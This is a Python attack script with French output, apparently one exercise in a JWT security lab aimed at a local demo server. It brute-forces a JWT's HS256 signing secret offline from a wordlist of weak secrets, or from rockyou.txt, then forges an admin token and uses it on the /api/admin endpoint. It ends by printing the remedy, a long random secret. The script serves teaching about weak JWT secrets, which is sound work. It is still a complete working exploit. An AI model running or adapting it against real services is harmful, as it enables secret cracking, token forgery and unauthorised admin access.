import json
import hmac
import hashlib
import base64
import time
import sys
import os
import requests

BASE_URL = "http://localhost:3000"

BUILT_IN_WORDLIST = [
    "password", "123456", "admin", "letmein", "qwerty", "abc123",
    "monkey", "dragon", "master", "welcome", "login", "pass",
    "test", "root", "user", "key", "hello", "world",
    "secret", "mysecret", "jwt", "jwtkey", "jwt_secret", "secretkey",
    "supersecret", "token", "mytoken", "authkey", "hmackey",
    "password1", "Password1", "p@ssword", "s3cr3t", "S3cr3t",
]


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_encode_json(obj):
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def banner(title):
    print("\n" + "-" * 60)
    print(" " + title)
    print("-" * 60)


def try_candidate(header_b64, payload_b64, token_sig, candidate):
    expected = hmac.new(
        candidate.encode(),
        f"{header_b64}.{payload_b64}".encode(),
        hashlib.sha256,
    ).digest()
    return b64url_encode(expected) == token_sig


def run():
    banner("ATTAQUE 3 : Force brute du secret HS256 (offline)")

    print("\n[1] Obtention d'un token JWT HS256 valide (login alice)...")
    r = requests.post(f"{BASE_URL}/auth/login", json={"username": "alice", "password": "password123"})
    token = r.json()["token"]
    print(f"    Token intercepte : {token}")

    parts = token.split(".")
    if len(parts) != 3:
        print("Format de token inattendu")
        return
    header_b64, payload_b64, token_sig = parts

    wordlist_arg = None
    if "--wordlist" in sys.argv:
        idx = sys.argv.index("--wordlist")
        if idx + 1 < len(sys.argv):
            wordlist_arg = sys.argv[idx + 1]

    if wordlist_arg and os.path.exists(wordlist_arg):
        wordlist_name = os.path.basename(wordlist_arg)
        print(f"\n[2] Dictionnaire externe : {wordlist_arg}")
        wordlist = None
    else:
        wordlist_name = "dictionnaire integre"
        print(f"\n[2] Dictionnaire integre ({len(BUILT_IN_WORDLIST)} mots)")
        wordlist = BUILT_IN_WORDLIST

    print(f"\n[3] Demarrage de l'attaque par force brute ({wordlist_name})...")
    print(f"    Header JWT  : {header_b64}")
    print(f"    Signature   : {token_sig}")
    print()

    start_time = time.time()
    tested = 0
    found = None

    if wordlist:
        for word in wordlist:
            tested += 1
            print(f'\r    Teste : {tested:>5} / {len(wordlist)} — candidat courant : "{word:<20}"', end="", flush=True)
            if try_candidate(header_b64, payload_b64, token_sig, word):
                found = word
                break
        print()
    else:
        with open(wordlist_arg, encoding="latin-1") as f:
            for line in f:
                word = line.strip()
                if not word:
                    continue
                tested += 1
                if tested % 10000 == 0:
                    print(f"\r    Teste : {tested:,} mots...", end="", flush=True)
                if try_candidate(header_b64, payload_b64, token_sig, word):
                    found = word
                    break
        print()

    elapsed = time.time() - start_time
    rate = int(tested / elapsed) if elapsed > 0 else tested

    print(f"\n    Mots testes : {tested:,}")
    print(f"    Duree       : {elapsed:.3f}s")
    print(f"    Debit       : ~{rate:,} hash/s (Python mono-thread)")

    if found:
        print(f'\nSECRET TROUVE : "{found}"')
        print("\n[4] Exploitation — forge d'un token admin avec le secret decouvert...")

        f_header = b64url_encode_json({"alg": "HS256", "typ": "JWT"})
        f_payload = b64url_encode_json({"username": "attacker", "role": "admin", "iat": int(time.time())})
        f_sig = b64url_encode(
            hmac.new(found.encode(), f"{f_header}.{f_payload}".encode(), hashlib.sha256).digest()
        )
        admin_token = f"{f_header}.{f_payload}.{f_sig}"

        admin_res = requests.get(f"{BASE_URL}/api/admin", headers={"Authorization": f"Bearer {admin_token}"})
        admin_data = admin_res.json()
        print(f"    Acces admin : {admin_res.status_code} {json.dumps(admin_data)}")
    else:
        print("\nSecret non trouve dans ce dictionnaire.")
        if not wordlist_arg:
            print("   -> Essayez avec rockyou.txt : --wordlist /path/to/rockyou.txt")

    banner("FIN DE L'ATTAQUE 3")
    print("\nCorrection : utiliser un secret aleatoire long (>= 256 bits).")
    print('Exemple :  secrets.token_hex(32)\n')


if __name__ == "__main__":
    try:
        run()
    except requests.ConnectionError:
        print("\n[ERREUR] Impossible de contacter le serveur.")
        print("-> Assurez-vous que le serveur est lance : python server.py\n")
